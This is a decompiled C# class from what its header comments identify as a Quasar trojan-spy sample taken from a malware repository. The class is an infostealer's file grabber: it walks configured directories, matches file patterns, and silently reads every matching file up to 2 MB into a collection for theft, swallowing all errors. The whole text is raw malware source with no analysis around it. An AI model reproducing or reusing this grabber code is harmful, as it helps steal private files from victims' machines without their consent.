// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.gg3
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public class gg3 : GH9kf<DesktopFile>
  {
    public IEnumerable<string> GrabberSettings { get; set; }

    public gg3() => this.GrabberSettings = (IEnumerable<string>) new List<string>();

    public List<DesktopFile> EnumerateData()
    {
      List<DesktopFile> desktopFileList = new List<DesktopFile>();
      try
      {
        if (this.GrabberSettings == null)
          return desktopFileList;
        foreach (string grabberSetting in this.GrabberSettings)
        {
          try
          {
            if (!string.IsNullOrEmpty(grabberSetting))
            {
              string[] strArray = grabberSetting.Split('|');
              if (strArray.Length == 2)
              {
                foreach (string file in Directory.GetFiles(Environment.ExpandEnvironmentVariables(strArray[0]), strArray[1], SearchOption.TopDirectoryOnly))
                {
                  try
                  {
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.Length <= 2097152L)
                      desktopFileList.Add(new DesktopFile()
                      {
                        FileData = File.ReadAllBytes(fileInfo.FullName),
                        Filename = fileInfo.Name
                      });
                  }
                  catch
                  {
                  }
                }
              }
            }
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return desktopFileList;
    }
  }
}
